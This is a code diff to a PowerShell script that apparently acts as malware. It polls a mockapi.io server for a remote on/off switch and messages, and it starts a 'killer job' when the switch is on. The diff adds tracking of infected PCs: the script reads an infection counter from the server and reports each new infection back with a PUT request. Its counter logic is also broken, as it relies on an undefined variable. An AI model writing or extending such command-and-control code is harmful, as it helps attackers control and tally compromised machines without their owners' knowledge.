@@ -58,27 +58,31 @@ Add-Type -AssemblyName System.Windows.Forms
 $global:isActive = $null
 $global:message = $null
 $global:messageIncr = $null
+$global:nbPcInfectIncr = $null
 $global:lastMessageIncr = ""
+$global:lastNbPcInfectIncr = ""
 
 function checkDataBase {
     try {
         $response = Invoke-RestMethod -Uri "https://68138d49129f6313e211a66e.mockapi.io/management" -Method Get -TimeoutSec 10
         
         if ($response -ne $null) {
-             $global:isActive = $response.isActive
-             if ($response.message -ne $null) {
-                 $global:message = $response.message.message
-                 $global:messageIncr = $response.message.incr
-             } else {
-                 Write-Warning "API response structure missing 'message' property."
-                 $global:message = $null
-                 $global:messageIncr = $null
-             }
+            $global:isActive = $response.isActive
+            $global:nbPcInfectIncr = $response.nbPcInfect.nbPcInfectIncr
+            if ($response.message -ne $null) {
+                $global:message = $response.message.message
+                $global:messageIncr = $response.message.incr
+            } else {
+                Write-Warning "API response structure missing 'message' property."
+                $global:message = $null
+                $global:messageIncr = $null
+            }
         } else {
             Write-Warning "API response was null."
             $global:isActive = $null
             $global:message = $null
             $global:messageIncr = $null
+            $global:nbPcInfectIncr = $null
         }
     } catch {
         Write-Error "Error checking database: $($_.Exception.Message)"
@@ -122,6 +126,7 @@ function main {
     checkDataBase
     if ($null -ne $global:messageIncr) {
         $global:lastMessageIncr = $global:messageIncr
+        $global:lastNbPcInfectIncr = $global:nbPcInfectIncr
     } else {
         Write-Warning "Initial database check failed or returned null increment. Last message check might be inaccurate initially."
         $global:lastMessageIncr = [System.Guid]::NewGuid().ToString()
@@ -146,6 +151,24 @@ function main {
                 }
                 $global:lastMessageIncr = $global:messageIncr
             }
+
+            if ($global:nbPcInfectIncr -ne $global:lastNbPcInfectIncr) {
+                $body = @{
+                    nbPcInfect = @{
+                        nbPcInfect = $global:nbPcInfect + 1
+                    }
+                } | ConvertTo-Json
+
+                $headers = @{
+                    "Content-Type" = "application/json"
+                }
+
+                $response = Invoke-RestMethod -Uri "https://68138d49129f6313e211a66e.mockapi.io/management/1" `
+                                            -Method Put `
+                                            -Body $body `
+                                            -Headers $headers
+            }
+
 
             if ($global:isActive -and -not $isRunning) {
                 Write-Host "isActive is true. Starting killer job..." -ForegroundColor Green
